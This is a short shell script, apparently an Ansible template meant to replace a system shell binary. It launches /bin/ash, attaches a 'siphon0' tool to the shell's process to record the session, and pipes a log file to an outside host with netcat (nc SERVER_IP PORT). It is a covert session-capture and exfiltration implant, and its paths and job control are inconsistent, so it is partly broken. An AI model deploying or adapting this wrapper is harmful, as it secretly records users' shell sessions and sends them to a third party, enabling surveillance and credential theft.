#!/bin/sh

# Output filepath (inserted by ansible)
logfile="/outputfile"

# Start a new instance of {{ file_to_replace }} in the background
/bin/ash "$@" &

# Capture the PID of the background /bin/ash process
PID=$!

# Run /bin/siphon in the background, redirect its output to /output.txt
# Send /output.txt content to an external server using Netcat (nc)
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
/bin/siphon0 "$PID" >> $logfile 2>&1 &

# Use Netcat to send the log to an external server (replace SERVER_IP and PORT)
tail -f /output.txt | nc SERVER_IP PORT &

# Bring the background /bin/ash process to the foreground
fg %1
